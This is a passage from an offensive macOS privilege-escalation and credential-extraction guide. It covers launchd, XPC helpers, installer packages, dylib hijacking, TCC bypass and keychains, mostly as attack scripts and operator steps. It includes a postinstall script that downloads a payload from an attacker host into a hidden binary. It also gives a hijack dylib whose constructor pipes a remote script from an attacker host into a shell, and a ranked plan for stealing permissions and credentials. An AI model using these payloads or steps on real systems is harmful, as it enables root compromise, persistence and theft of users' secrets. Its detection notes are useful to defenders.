`authd` and `/var/db/auth.db` implement the authorisation rights system, which is what produces the "enter your password to allow this" dialogues and which gates a large amount of privileged system configuration independently of `sudo`. Understanding it is what lets you distinguish "this needs root" from "this needs an admin's password" from "this needs nothing".

A **right** is a named policy (`system.privilege.admin`, `system.preferences.network`, `system.install.software`). A right has a `class`, which is `allow`, `deny`, `user`, `rule`, or `evaluate-mechanisms`. A `class=user` right names a `group` whose members satisfy it with their own password, which is why `admin` group membership is so broadly powerful. A `class=evaluate-mechanisms` right runs an ordered list of **mechanisms**, which are plugin-provided steps, and that is the hook used for authorisation plugin persistence.

```bash
# Read a right. No privilege needed to read.
security authorizationdb read system.privilege.admin
security authorizationdb read system.preferences
security authorizationdb read system.login.console
security authorizationdb read system.install.software

# Dump the shipped defaults, which is a complete catalogue of every right and rule.
plutil -p /System/Library/Security/authorization.plist | less
```

Reading `system.preferences` on current macOS gives you the shape:

```text
allow-root = true
authenticate-user = true
class = user
group = admin
comment = "Checked by the Admin framework when making changes to certain System Preferences."
session-owner = false
shared = true
timeout = 2147483647
tries = 10000
```

`group = admin` plus `class = user` is the pattern to look for: any admin's own password satisfies it. `shared = true` and a long `timeout` mean a successful authentication is cached and reused, which is why authenticating once in System Settings unlocks several panes.

Writing rights requires you to already be authorised:

```bash
# Read, modify, write back the full plist.
security authorizationdb read system.preferences > /tmp/right.plist
# edit /tmp/right.plist
sudo security authorizationdb write system.preferences < /tmp/right.plist

# Shorthand: set the class directly.
sudo security authorizationdb write system.preferences allow
```

**Be honest about what this is.** Setting a right to `allow` removes a prompt. It is not a privilege escalation primitive on its own, because writing to the database requires satisfying an authorisation check first: as root it is silent, as an admin it prompts for your own password, and as a standard user it fails. Its real value is **privilege consolidation and prompt suppression after you already have admin or root**, which is exactly how adware families have used it for years. Published material that presents `security authorizationdb write` as a standard-user-to-root escalation is wrong. What it genuinely buys you is a quieter follow-on: an operation that would have popped a dialogue on the user's screen no longer does, which matters a great deal given how visible dialogues are on this platform.

The right most worth knowing about is `system.login.console`, whose `mechanisms` array is evaluated at every console login. Adding a mechanism entry pointing at a bundle in `/Library/Security/SecurityAgentPlugins` is a root-level persistence and credential-capture mechanism, covered under persistence below. Note that Apple substantially narrowed this: authorisation plugin code now executes in a separate `authorizationhosthelper` XPC service with a much reduced entitlement set rather than inside `authorizationhost` with password-extraction entitlements, which killed the clean plaintext-credential-capture version of the technique. <!-- VERIFY: exact remaining entitlement set on macOS 26 -->

### Setuid and setgid binaries

The sweep is the same as Linux; the results are not, because macOS ships very few setuid binaries and SIP protects them all.

```bash
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -ls 2>/dev/null
```

On current macOS the shipped set is short and stable:

```text
/usr/bin/top      /usr/bin/su       /usr/bin/newgrp   /usr/bin/login
/usr/bin/at       /usr/bin/atq      /usr/bin/atrm     /usr/bin/batch
/usr/bin/crontab  /usr/bin/quota    /usr/bin/sudo     /bin/ps
/usr/sbin/traceroute  /usr/sbin/traceroute6
/usr/libexec/authopen
/usr/libexec/security_authtrampoline
```

Two of those are worth understanding rather than just noting. `/usr/libexec/authopen` opens a file with elevated privilege after checking an authorisation right, and is the supported way for unprivileged code to get a file descriptor on a privileged file with user consent. `/usr/libexec/security_authtrampoline` is the helper behind `AuthorizationExecuteWithPrivileges`, which is the deprecated API third-party applications use to run a tool as root after prompting. Any third-party application still calling `AuthorizationExecuteWithPrivileges` is worth auditing, because the API has no way to validate the integrity of the target binary after the fork, and a long tail of vulnerabilities in commercial macOS software comes from exactly that gap. It is deprecated but not removed, and it still works.

The productive part of the setuid sweep on macOS is not Apple's binaries, it is third-party ones. Enterprise software, VPN clients, backup agents, developer tools and virtualisation products install their own setuid helpers, and those are neither SIP-protected nor audited. Anything appearing in that `find` output outside the list above is a finding.

### Launch daemon and launch agent misconfiguration

This is the highest-yield generic local escalation on macOS, and it maps onto the Linux systemd-unit and cron-writable-script classes with different specifics.

**What it is.** A launchd job runs as a defined user, usually root for daemons. If any component of that job is writable by you, you get code execution as that user.

**Why it works.** `launchd` reads the plist, resolves `Program` or `ProgramArguments`, and executes it as the specified `UserName` with no verification of the target binary's ownership, signature, or integrity beyond the normal Gatekeeper and platform policy that applies to any execution. There is no equivalent of systemd's tightened defaults. If the plist is writable you control the whole job; if only the target program is writable you control what runs.

**Preconditions.** Write access to the plist, or to the referenced program, or to any parent directory of either that lets you replace it, or to a `WatchPaths` or `QueueDirectories` entry that triggers the job.

```bash
# Writable plists in the system domains. Any hit here is root.
find /Library/LaunchDaemons /Library/LaunchAgents /Library/Security -type f \
  \( -perm -0002 -o -perm -0020 \) -ls 2>/dev/null

# Writable target programs. This is the more common finding by far.
for f in /Library/LaunchDaemons/*.plist /Library/LaunchAgents/*.plist; do
  [ -f "$f" ] || continue
  prog=$(plutil -extract ProgramArguments.0 raw -o - "$f" 2>/dev/null \
         || plutil -extract Program raw -o - "$f" 2>/dev/null)
  [ -n "$prog" ] || continue
  if [ -w "$prog" ] 2>/dev/null; then echo "WRITABLE PROGRAM: $prog  <- $f"; fi
  d=$(dirname "$prog"); if [ -w "$d" ] 2>/dev/null; then echo "WRITABLE DIR: $d  <- $f"; fi
done

# WatchPaths and QueueDirectories that you can write to, which gives you a trigger.
for f in /Library/LaunchDaemons/*.plist; do
  plutil -p "$f" 2>/dev/null | grep -A5 -E 'WatchPaths|QueueDirectories' \
    | grep -oE '"/[^"]+"' | tr -d '"' | while read -r p; do
      [ -w "$p" ] 2>/dev/null && echo "WRITABLE TRIGGER: $p  <- $f"
    done
done
```

**Commands, once you have a writable component.** The domain model matters here. Use `bootstrap` and `bootout` rather than the legacy `load` and `unload`, though both still work.

```bash
# System daemon: runs as root, at boot, without any user logged in.
sudo launchctl bootstrap system /Library/LaunchDaemons/com.example.job.plist
sudo launchctl kickstart -k system/com.example.job
sudo launchctl bootout system/com.example.job

# User agent in the GUI session, which is what you need for anything touching
# the window server, the pasteboard, or the user's keychain.
launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.example.agent.plist
launchctl kickstart -k gui/$(id -u)/com.example.agent
launchctl bootout gui/$(id -u)/com.example.agent

# Legacy equivalents, still functional and still what most tooling emits.
launchctl load -w ~/Library/LaunchAgents/com.example.agent.plist
launchctl unload ~/Library/LaunchAgents/com.example.agent.plist
```

**Verify it worked.**

```bash
launchctl print system/com.example.job | head -30      # state, last exit, pid
launchctl list com.example.job                          # legacy: pid, last exit status
launchctl blame system/com.example.job                  # why it is running
/usr/bin/log show --last 5m --predicate 'process == "launchd"' --style compact \
  | grep com.example.job
```

**Detection and opsec.** Since macOS 13, Background Task Management observes launch item registration and both notifies the user and emits an Endpoint Security event. See Persistence on macOS below; the short version is that dropping a plist is no longer quiet.

**Failure modes.**

- `Bootstrap failed: 5: Input/output error` usually means the plist is malformed or the `Label` does not match, or a job with that label is already loaded.
- `Load failed: 5: Input/output error` on the legacy path, same causes.
- `Operation not permitted` writing to `~/Library/LaunchAgents` means TCC is in the way, which happens when your process lacks the app-management or full-disk permission.
- The job loads and immediately exits with status 78 (`EX_CONFIG`) if the program path does not exist or is not executable.
- A daemon plist with a `LimitLoadToSessionType` of `Aqua` will never load in the system domain. Agents need a session; daemons must not specify one.
- Plists must be owned by root and not group- or world-writable to load in the system domain; launchd refuses insecure plists. This is worth knowing because it also means your writable-plist finding may not be loadable until you fix its permissions.

### Privileged helper tools and XPC

**What it is.** The dominant real-world local privilege escalation bug class in third-party macOS software. A GUI application that needs to do privileged things installs a root-running helper daemon and talks to it over XPC or Mach IPC. If the helper validates its callers badly, any local process can drive it and get root.

**Why it works.** The helper must decide whether the connecting client is the legitimate application. `NSXPCConnection` exposes two ways to identify the peer: `processIdentifier`, a plain integer pid, and `auditToken`, an immutable kernel-issued token bound to a specific process instance. The vulnerable pattern is to take `processIdentifier` and feed it to `SecCodeCopyGuestWithAttributes` with `kSecGuestAttributePid` to build a `SecCode` and check its signature. **Pids are recycled.** Between the connection being accepted and the check being performed there is a race, and an attacker can arrange for that pid to be re-used by an attacker-controlled process, typically with `posix_spawn` and `POSIX_SPAWN_SETEXEC`, so the signature check passes against a process that is no longer the one talking. The fix is to validate `auditToken` with `kSecGuestAttributeAudit`, which cannot be recycled. Apple made `auditToken` public API specifically to move developers off the pid path.

A second, distinct bug in the same family is a badly constructed code requirement. A helper that checks bundle identifier and team identifier but omits `anchor apple generic` from its `SecRequirement` string can be satisfied by a self-signed certificate carrying the same identifier strings.

**Preconditions.** A helper in `/Library/PrivilegedHelperTools` (or any root daemon exposing a `MachServices` entry) that validates clients by pid, or with an incomplete requirement string. Local code execution as any user.

```bash
# The helper inventory. On a real corporate Mac this is populated.
ls -la /Library/PrivilegedHelperTools/

# Which Mach service names each root daemon exposes: your IPC target list.
for f in /Library/LaunchDaemons/*.plist; do
  n=$(plutil -p "$f" 2>/dev/null | grep -A10 MachServices | grep -oE '"[a-zA-Z0-9._-]+" =>' | tr -d '">=' )
  [ -n "$n" ] && printf '%s\n  %s\n' "$f" "$n"
done

# Triage a helper for the vulnerable pattern. The presence of the symbol is not
# proof, but its absence alongside a present processIdentifier is a strong hint.
for h in /Library/PrivilegedHelperTools/*; do
  [ -f "$h" ] || continue
  echo "=== $h"
  codesign -dv --entitlements - "$h" 2>&1 | grep -E 'Identifier|TeamIdentifier|flags'
  nm -u "$h" 2>/dev/null | grep -iE 'processIdentifier|auditToken|SecCodeCopyGuest' 
  strings -a "$h" 2>/dev/null | grep -iE 'anchor apple|certificate leaf|identifier "' | head -5
done
```

Real observed helpers on a corporate machine include `com.microsoft.autoupdate.helper`, `com.microsoft.office.licensingV2.helper` and `us.zoom.ZoomDaemon`, alongside privilege-elevation products' own helpers. Auto-updaters and licence managers are the highest-yield category, because they are written to install and execute code as root by design.

**Verify it worked.** You have root when a command you handed to the helper runs as uid 0. Prove it with something that leaves an artefact you can read rather than trusting a return code.

**Detection and opsec.** The XPC traffic itself is largely invisible. What is visible is whatever the helper does on your behalf: process execution shows up in Endpoint Security `NOTIFY_EXEC` with the helper as the parent, which is anomalous and is exactly what a decent EDR rule looks for. A root shell whose parent is `com.vendor.updater.helper` is a loud artefact even though the exploitation was quiet.

**Failure modes.** The connection is refused outright if the helper checks correctly. The race fails most of the time and needs to be looped. Many helpers expose only a narrow, non-parameterised API (`installUpdateFromPath:`), so winning the validation race still leaves you needing a file-write or path-control primitive to reach code execution.

### Application bundle and directory permissions

**What it is.** Replacing or adding a file inside an application bundle so your code runs when the application next launches, potentially with more privilege or, more usefully, with the application's TCC grants and code identity.

**Why it works and where it stops.** Modifying a signed bundle invalidates its code signature, because the seal covers resources as well as the executable. What happens next depends on enforcement: a hardened-runtime binary will fail dyld's checks, a quarantined bundle will fail Gatekeeper assessment on next launch, and `tccd` will refuse to honour a recorded grant because the `csreq` no longer matches. So naive overwriting is unreliable. The reliable versions are re-signing the whole bundle ad-hoc (which loses the original team identity and therefore the TCC grant), and finding a bundle that is not signed, is only ad-hoc signed, or has a component outside the sealed resources.

**Preconditions.** Write access to the bundle. On current macOS, modifying another application's bundle is itself gated by TCC (`kTCCServiceSystemPolicyAppBundles`), which means even root cannot do it silently from a non-granted process.

```bash
# Bundles you can write to. /Applications is admin-group-writable, so as an
# admin this returns a lot; as a standard user, any hit is interesting.
find /Applications /Library -name '*.app' -maxdepth 4 -type d 2>/dev/null | while read -r a; do
  [ -w "$a" ] && echo "WRITABLE BUNDLE: $a"
  find "$a/Contents" -maxdepth 3 -type d \( -perm -0002 -o -perm -0020 \) 2>/dev/null \
    | sed 's/^/  writable dir: /'
done | head -60

# Unsigned or ad-hoc-signed bundles, which are the ones worth modifying.
for a in /Applications/*.app; do
  s=$(codesign -dv "$a" 2>&1)
  echo "$s" | grep -q 'TeamIdentifier=not set' && echo "AD-HOC/UNSIGNED: $a"
  echo "$s" | grep -q 'code object is not signed' && echo "UNSIGNED: $a"
done

# Verify a bundle's seal, which is how a defender finds your tampering.
codesign --verify --deep --strict --verbose=4 /Applications/Target.app
```

A real sweep on a corporate machine turns up bundles with no hardened runtime at all, which are the free ones. Observed example: an application whose `codesign -dv` reports `flags=0x0(none)`, meaning no hardened runtime, no library validation, no restrictions.

### Installer packages and postinstall scripts

**What it is.** A `.pkg` runs `preinstall` and `postinstall` scripts as root at install time. It is the supported, documented, universally used mechanism for running arbitrary root code on macOS, and it is what MDM, Jamf, Munki and every software vendor rely on.

**Why it works.** Package installation is a privileged operation authorised by the `system.install.*` rights. Once authorised, `installd` extracts the payload and executes the bundled scripts as root. There is no sandbox and no restriction on what the scripts do. The distinction that matters for tradecraft is that the `Distribution` file's embedded JavaScript (`installCheck`, `volumeCheck`) executes *before* elevation, as the invoking user, which makes it a pre-elevation reconnaissance and staging surface, while `preinstall` and `postinstall` execute *after* elevation, as root.

```bash
# Inspect a package before installing it. --expand-full also decompresses the
# Payload and Scripts, which --expand leaves as cpio archives.
pkgutil --expand-full /path/to/thing.pkg /tmp/pkg
pkgutil --expand /path/to/thing.pkg /tmp/pkg          # documented form
ls -la /tmp/pkg /tmp/pkg/*/Scripts 2>/dev/null
cat /tmp/pkg/Distribution
cat /tmp/pkg/*/Scripts/postinstall 2>/dev/null
pkgutil --payload-files /path/to/thing.pkg
installer -pkginfo -pkg /path/to/thing.pkg
installer -query RestartAction -pkg /path/to/thing.pkg
```

`--expand-full` is not in the current man page or `--help` output but is real and works, and is what you actually want for reading scripts. <!-- VERIFY: undocumented, confirm on target build -->

```bash
# Build one. Root code execution wrapped in a supported installer format.
mkdir -p /tmp/build/scripts /tmp/build/root
cat > /tmp/build/scripts/postinstall <<'EOS'
#!/bin/sh
/usr/bin/curl -fsSL http://$ATTACKER/stage -o /usr/local/bin/.helper
/bin/chmod 755 /usr/local/bin/.helper
exit 0
EOS
chmod +x /tmp/build/scripts/postinstall
pkgbuild --root /tmp/build/root --scripts /tmp/build/scripts \
  --identifier com.example.update --version 1.0 /tmp/update.pkg

# Install. -allowUntrusted accepts an unsigned or expired-certificate package.
sudo installer -pkg /tmp/update.pkg -target / -allowUntrusted -verbose
```

**The CLI versus GUI distinction is the operationally significant part.** Double-clicking a quarantined `.pkg` goes through Installer.app and LaunchServices, and is Gatekeeper-assessed: unnotarised packages are blocked. Running `sudo installer -pkg X.pkg -target /` from a shell does not take that path, and `-allowUntrusted` explicitly accepts an unsigned package. So if you already have root or a `sudo` credential, package installation is an unsigned-code-execution route with no Gatekeeper involvement at all, and it is the same route the organisation's own management tooling uses.

**Verify it worked.**

```bash
pkgutil --pkgs | grep com.example.update
pkgutil --pkg-info com.example.update
grep -i 'com.example.update' /var/log/install.log | tail -5
```

**Detection and opsec.** `/var/log/install.log` is plaintext, world-readable, and records every package install with the identifier and version. It is the first place any macOS responder looks and it is not something you can suppress without root and obvious tampering. `pkgutil --pkgs` and the receipts in `/var/db/receipts/` are a permanent inventory. Endpoint Security sees the `postinstall` script executing with `installd` as its parent, which is a well-known detection signature. Packages are a superb execution mechanism and a terrible stealth mechanism.

### Dylib hijacking and insertion

**What it is.** Getting your dynamic library loaded into another process, either at launch (hijacking a dependency the loader will search for) or by injection (`DYLD_INSERT_LIBRARIES`). The prize is usually not privilege but code identity: running inside a process that holds TCC grants, a keychain ACL entry, or a network position you do not.

**Why it works: the search order.** `dyld` resolves load commands containing three special tokens:

| Token | Resolves to |
| --- | --- |
| `@executable_path` | The directory containing the process's main executable |
| `@loader_path` | The directory containing the Mach-O that holds the load command. Differs from `@executable_path` when a dylib loads another dylib |
| `@rpath` | Each `LC_RPATH` entry in the loading image, and transitively in the images that loaded it, tried in order. First hit wins |

That gives two hijack primitives.

**`LC_RPATH` hijacking.** A dependency loaded as `@rpath/Foo.framework/Versions/A/Foo` is searched for in each `LC_RPATH` directory in order. If an earlier-searched rpath directory does not contain the library but is writable, you plant your dylib there and it is found first.

**`LC_LOAD_WEAK_DYLIB` hijacking.** A weakly linked dylib is one `dyld` will silently continue past if it is absent. "Weak" means "do not fail if missing", not "verify if present". A binary referencing a weak dylib at a path that does not exist, where you can create that path, loads your library with no error and no fallback.

**Why it mostly does not work any more, which is the key modern caveat.** Library validation. When in force, the kernel will only map a Mach-O into the process if it is signed by the **same team identifier** as the main executable, or by Apple. Not merely signed, and not merely notarised: the same team. The hardened runtime enables library validation, and the hardened runtime is required for notarisation, so it is effectively universal on current third-party software. An ad-hoc or self-signed dylib will not load into a hardened binary, full stop.

The exception is the entitlement `com.apple.security.cs.disable-library-validation`, and it is common enough to be worth a systematic hunt because plugin ecosystems require it. A real sweep of `/Applications` on a corporate Mac:

```text
Google Chrome.app          0x12a00(kill,restrict,library-validation,runtime)   -
Microsoft Edge.app         0x12a00(kill,restrict,library-validation,runtime)   -
Safari.app                 0x2000(library-validation)                          -
Microsoft Word.app         0x10000(runtime)     allow-jit disable-library-validation
Microsoft Excel.app        0x10000(runtime)     allow-jit disable-library-validation
Microsoft PowerPoint.app   0x10000(runtime)     allow-jit disable-library-validation
Obsidian.app               0x10000(runtime)     allow-jit allow-unsigned-executable-memory
                                                disable-library-validation
Burp Suite.app             0x10000(runtime)     allow-jit allow-unsigned-executable-memory
                                                disable-executable-page-protection
                                                disable-library-validation
Universal Print.app        0x0(none)            -
```

Read that table as your target list. The browsers are hardened with explicit library validation and are not worth attacking this way. The Office applications, note-taking applications, and security tools carry `disable-library-validation` because they load third-party plugins, and are therefore injectable with an arbitrary unsigned dylib. And an application reporting `flags=0x0(none)` has no hardened runtime at all, which means no library validation and no `DYLD_*` restriction.

Current viability, stated precisely:

| Target | Unsigned or ad-hoc dylib loads? |
| --- | --- |
| Hardened runtime, no relaxing entitlement | No. Library validation rejects it |
| Hardened runtime with `disable-library-validation` | **Yes**. This is the live technique |
| Signed but not hardened (no `runtime` flag) | Generally yes, via rpath or weak-dylib hijack |
| Unsigned or ad-hoc signed | Yes |
| Apple platform binary | No, under any circumstances, with SIP on |

**Finding hijackable load commands:**

```bash
# rpath entries and weak dylibs in one pass.
otool -l /Applications/Target.app/Contents/MacOS/Target \
  | grep -A3 -E 'LC_RPATH|LC_LOAD_WEAK_DYLIB'

# The structured view. Note the flag is -linked_dylibs, not -dependents.
dyld_info -linked_dylibs -load_commands /Applications/Target.app/Contents/MacOS/Target
dyld_info -dlopens /Applications/Target.app/Contents/MacOS/Target   # runtime dlopen paths

# Sweep every third-party binary for weak dylibs whose path does not exist,
# which is the exact precondition for a weak-dylib hijack.
for b in /Applications/*/Contents/MacOS/*; do
  [ -f "$b" ] || continue
  otool -l "$b" 2>/dev/null | awk '/LC_LOAD_WEAK_DYLIB/{f=1} f&&/name /{print $2; f=0}' \
    | while read -r p; do
        case "$p" in @*) continue;; esac
        [ -e "$p" ] || echo "MISSING WEAK DEP: $p  <- $b"
      done
done
```

**Building the payload.** A hijack dylib must export the same symbols the real one did, or the process crashes on first use. The standard approach is a proxy: re-export the original library so all symbols resolve through, and do your work in a constructor.

```bash
# Re-export proxy. The constructor runs at load, then everything else forwards on.
cat > /tmp/hijack.c <<'EOF'
#include <stdlib.h>
__attribute__((constructor))
static void init(void) {
    system("/bin/sh -c '/usr/bin/curl -fsSL http://$ATTACKER/s | /bin/sh' &");
}
EOF
clang -dynamiclib -o /tmp/libhijack.dylib /tmp/hijack.c \
  -Wl,-reexport_library,/path/to/original.dylib \
  -install_name @rpath/Original.framework/Versions/A/Original
install_name_tool -change /path/to/original.dylib \
  @loader_path/Original.real.dylib /tmp/libhijack.dylib
codesign -f -s - /tmp/libhijack.dylib      # mandatory on Apple silicon
```

**`DYLD_INSERT_LIBRARIES` and the environment routes.** This is the direct injection path and it is blocked in more cases than not. `dyld` ignores every `DYLD_*` variable when:

- The target is setuid or setgid. Unconditional, regardless of entitlements.
- The target has the hardened runtime and lacks `com.apple.security.cs.allow-dyld-environment-variables`.
- The target is an Apple platform binary.
- The target is flagged restricted (the `restrict` bit in the CodeDirectory flags).

Note the two-entitlement requirement that catches people out: honouring the variable needs `allow-dyld-environment-variables`, and the inserted library then still has to pass library validation, so an unsigned payload additionally needs `disable-library-validation`. An application with only the first is not injectable with your dylib.

```bash
DYLD_INSERT_LIBRARIES=/tmp/libhijack.dylib /Applications/Target.app/Contents/MacOS/Target
DYLD_PRINT_LIBRARIES=1 /Applications/Target.app/Contents/MacOS/Target 2>&1 | head -40
```

Other `DYLD_*` variables follow the same rules and are occasionally more useful because they hijack a search path rather than force a load: `DYLD_LIBRARY_PATH`, `DYLD_FRAMEWORK_PATH`, `DYLD_FALLBACK_LIBRARY_PATH`, `DYLD_FALLBACK_FRAMEWORK_PATH`. `DYLD_PRINT_LIBRARIES` and `DYLD_PRINT_RPATHS` are diagnostics that tell you exactly what the loader tried, which is how you find hijack points empirically rather than by reading load commands.

A launchd plist's `EnvironmentVariables` dictionary sets these for the job, which is a way to inject into a daemon you can edit the plist of. `launchctl setenv` sets them for the whole user session, which is loud and affects everything.

**Verify it worked.**

```bash
# Is your library actually mapped into the target?
vmmap $(pgrep -n Target) 2>/dev/null | grep -i hijack
lsof -p $(pgrep -n Target) | grep -i '\.dylib' | grep -i hijack
sample $(pgrep -n Target) 1 2>/dev/null | grep -i hijack
```

**Detection and opsec.** Endpoint Security emits `ES_EVENT_TYPE_NOTIFY_MMAP` for library loads, so mapping an unsigned dylib from a user-writable path into a signed application is directly observable and is a standard EDR rule. `codesign --verify --deep --strict` on the target bundle fails after a bundle-internal hijack. The unified log's `com.apple.securityd` and code-signing subsystems record validation failures. Writing a dylib into an application bundle also touches `kTCCServiceSystemPolicyAppBundles`, generating a TCC decision that is itself logged.

**Failure modes.**

- `code signature invalid` or a silent immediate exit: library validation rejected your dylib. Check for the `runtime` flag and the entitlement.
- `Symbol not found` on launch: your proxy does not re-export everything the real library provided.
- `Library not loaded ... Reason: tried: ...` lists every path `dyld` attempted, which is a gift: it tells you exactly where to plant the file.
- Nothing happens with `DYLD_INSERT_LIBRARIES`: the variable was stripped. Confirm with `DYLD_PRINT_LIBRARIES=1`, and if that also prints nothing, the binary is restricted.
- The dylib loads on Intel and not on Apple silicon: you did not sign it. Ad-hoc is enough.

### TCC bypass as its own escalation category

Treat this as a separate axis. You are not trying to become root, you are trying to acquire a permission, and the two are independent. A standard user with Full Disk Access has read access to more of what you care about than root without it.

The recurring mechanism families, with current status. I will describe mechanisms rather than assert CVE numbers I have not confirmed.

| Family | Mechanism | Status |
| --- | --- | --- |
| **Inherit from a granted parent** | TCC attributes to the responsible process. Code run from a terminal, IDE, or automation tool that holds a grant inherits it | **Fully live and not a bug.** This is designed behaviour and it is the primary technique |
| **Inject into a granted application** | Load code into a process that already holds the grant, via dylib hijack, `DYLD_INSERT_LIBRARIES`, bundle modification, or task port injection | **Live against applications without library validation.** Blocked against hardened applications lacking the relaxing entitlement |
| **Abuse an Automation grant** | Use an application already holding `kTCCServiceAppleEvents` for a target to drive that target | **Live but narrowed.** Since macOS 10.14, grants are scoped per source-and-target pair rather than blanket, so chaining requires both legs already approved |
| **`$HOME` or path redirection against `tccd`** | Point the daemon at a directory you control so it reads your forged database | **Fixed.** The `launchctl setenv HOME` variant was closed in 2020. Later variants of the same class have also been fixed |
| **Mount over a protected path** | Mount a disk image or APFS snapshot over `~/Library` or another protected location, supplying a forged database, or mount with `noowners` to bypass ownership | **Hardened.** Snapshot mounting was tied to Full Disk Access from Catalina 10.15.4/10.15.5 onward, so it still functions but only for a process that already holds FDA, which defeats the point. The disk-image-over-`~/Library` regression was fixed in the Monterey cycle |
| **Separately stored authorisation** | Some permissions are not in `TCC.db` at all. Location authorisation lives in `/var/db/locationd/clients.plist`, and the containing directory was historically an unprotected mount point | **Fixed for the known instance.** The class is worth checking for on any new permission the OS introduces |
| **Direct database write** | Write rows into `TCC.db` with sqlite | **Requires Full Disk Access already.** Malware observed in 2026 fails this with a kernel protection error. Even with write access, `tccd` re-evaluates the `csreq` blob against the real binary and caches in memory, so a naive row insert does nothing without a `killall tccd` |
| **Create a new user with a forged database** | Root creates an account paired with a prepared TCC database to reach another user's data | **Fixed in macOS 14 Sonoma** <!-- VERIFY --> |
| **Metadata importer and plugin abuse** | Spotlight importers, QuickLook generators and similar plugins run in contexts that can leak bytes from protected files | **Reported as still viable on macOS 26.** Objective-See published a Spotlight-importer issue in March 2025 described as persisting into macOS 26. No CVE surfaced |
| **MDM PPPC push** | Grant yourself the permission through a configuration profile | **Fully live by design.** Requires control of MDM or of a signed profile the machine will accept |

The practical hierarchy for an operator, in order of what to try:

1. Determine whether your current process tree already has a grant, by testing a protected path.
2. Find a granted process you can join. Enumerate TCC grants from the unified log, cross-reference against the entitlement sweep, and pick a target with a grant and no library validation.
3. Find a granted process you can *ask*. An application with an Automation grant can be driven with AppleScript, and its target's data comes back to you.
4. Get control of MDM and grant yourself the permission properly.
5. Prompt the user, accepting that a dialogue on their screen is the loudest thing you can do on this platform.

### Recurring vulnerability classes, described generically

Rather than a CVE list that will be stale in six months, these are the classes that keep producing macOS local escalations. Audit for the pattern, not the instance.

**XPC client validation.** Covered above. Pid-based instead of audit-token-based peer identification, or an incomplete `SecRequirement` string omitting `anchor apple generic`. The dominant class in commercial software.

**Symlink and hardlink races in privileged file operations.** Root-running installers, updaters, log rotators and uninstallers that operate on paths in world-writable directories, or that `chown` a path after checking it. Classic TOCTOU, and macOS software is full of it because `/tmp`, `/var/tmp` and `/Users/Shared` are all world-writable and sticky.

**Insecure default permissions from third-party installers.** A package's `postinstall` script that creates a directory under `/Library/Application Support/Vendor` group- or world-writable, containing something a root daemon later reads or executes. Very common; sweep for it directly.

**Path interpretation and quarantine propagation gaps.** Anything that copies, extracts, or moves files with elevated privilege and fails to carry the quarantine attribute, or that resolves a path differently from the check that authorised it. The whole family of "app translocation was bypassed by X" findings sits here.

**Entitlement over-grant in signed helpers.** A signed binary carrying a powerful private entitlement (`com.apple.private.tcc.*`, `com.apple.rootless.*`, `com.apple.security.cs.disable-library-validation`) that can be induced to act on the attacker's behalf. Because the entitlement lives in the signature, you cannot forge it, but you may be able to persuade the legitimate holder to use it for you. Sweep for it:

```bash
# Binaries with interesting private entitlements. Not exploitable in themselves,
# but each one is a "can I make this do work for me" question.
for b in /Applications/*/Contents/MacOS/* /Library/PrivilegedHelperTools/* \
         /usr/libexec/* /usr/local/bin/*; do
  [ -f "$b" ] || continue
  e=$(codesign -d --entitlements - "$b" 2>/dev/null \
      | grep -oE 'com\.apple\.(private\.[a-z0-9._-]+|rootless\.[a-z0-9._-]+)' | sort -u)
  [ -n "$e" ] && printf '%s\n%s\n\n' "$b" "$e"
done
```

**Authorisation right misconfiguration by third-party software.** Applications that add their own rights with `class=allow`, or that reuse a shared right with a long timeout, weakening the prompt model for everything that shares it.

**Sandbox escape via an over-permissive XPC service or helper.** A sandboxed application's own bundled helper that is less confined than the parent. Enumerate `Contents/XPCServices` and `Contents/Library/LoginItems` in every bundle.

```bash
find /Applications -maxdepth 4 -type d \( -name 'XPCServices' -o -name 'LoginItems' \) 2>/dev/null
```

## Credential Extraction on macOS

This is where the value is. A developer's or executive's Mac holds cloud credentials, source repository tokens, browser session cookies for the identity provider, SSH keys to production, and a keychain full of everything else. The organising principle for this whole section is a three-way distinction that determines what is actually achievable:

| Requirement | What it means practically |
| --- | --- |
| **File read access only** | You have it the moment you have a shell as that user. No prompt, no password, no root |
| **Root** | You need `sudo` or an escalation, but no user secret |
| **The user's plaintext password** | You need to phish it, crack it, keylog it, or find it. This is the hard gate |
| **A TCC grant** | Neither privilege nor password helps. You need the permission |

Keep that mapping in mind for every item below. A great deal of published macOS credential tradecraft quietly assumes you have the user's password, which is the one thing you usually do not have.

### The two keychains

Current macOS runs two entirely different keychain implementations side by side, and conflating them is why a lot of tooling fails.

The **legacy file-based keychain** is the original Keychain Services store, a custom binary format, accessed through the `SecKeychain*` APIs and the `security` command. This is where the login keychain and the System keychain live.

The **data protection keychain** is the iOS-derived, SQLite-backed store, accessed through `SecItem*` with `kSecUseDataProtectionKeychain`. It is where iCloud Keychain items, Safari's saved passwords, the macOS 15 Passwords app's items, and anything from an application built against the modern API live.

Verified paths on current macOS:

| Path | Store |
| --- | --- |
| `~/Library/Keychains/login.keychain-db` | Legacy, per-user. The login keychain |
| `~/Library/Keychains/metadata.keychain-db` | Legacy format, internal bookkeeping for the modern stack <!-- VERIFY: exact purpose --> |
| `~/Library/Keychains/<UUID>/keychain-2.db` | Data protection, per-user. SQLite |
| `~/Library/Keychains/<UUID>/user.kb` | The user's keybag: the wrapped class keys for the above |
| `/Library/Keychains/System.keychain` | Legacy, machine-wide. Wi-Fi PSKs, machine certificates, AD machine password |
| `/Library/Keychains/system-keychain-2.db` | Data protection, machine-wide |
| `/Library/Keychains/apsd.keychain` | The Apple Push daemon's own legacy keychain |
| `/var/db/SystemKey` | 48 bytes, mode 0400 root. The unlock key for the System keychain |
| `/System/Library/Keychains/SystemRootCertificates.keychain` | Trusted root store |

```bash
ls -la ~/Library/Keychains/ /Library/Keychains/
security list-keychains
security default-keychain
security login-keychain
```

**Which store an item is in determines whether you can attack it offline.** The legacy format is well understood and there are parsers for it. The data protection keychain's SQLite database is encrypted per-item against class keys held in the keybag, which is unlocked by the login password and, on Apple silicon, mediated by the Secure Enclave. There is no public tooling that decrypts `keychain-2.db` offline. That is a real gap and it is worth being honest about: Safari passwords, iCloud Keychain items and anything in the Passwords app are effectively not offline-recoverable with current public tools. What you can get at is the legacy login keychain, which is still where the overwhelming majority of third-party application secrets land, because most applications still use the classic API.

### The unlock model

The login keychain's password is set to the account password at account creation, and the OS keeps them in sync on a normal password change. Two consequences matter.

First, **cracking a macOS account hash gives you the keychain**, which is why the `ShadowHashData` extraction under enumeration is more valuable than an equivalent Windows NT hash. One credential unlocks the account, the login keychain, and by extension every browser's Safe Storage key.

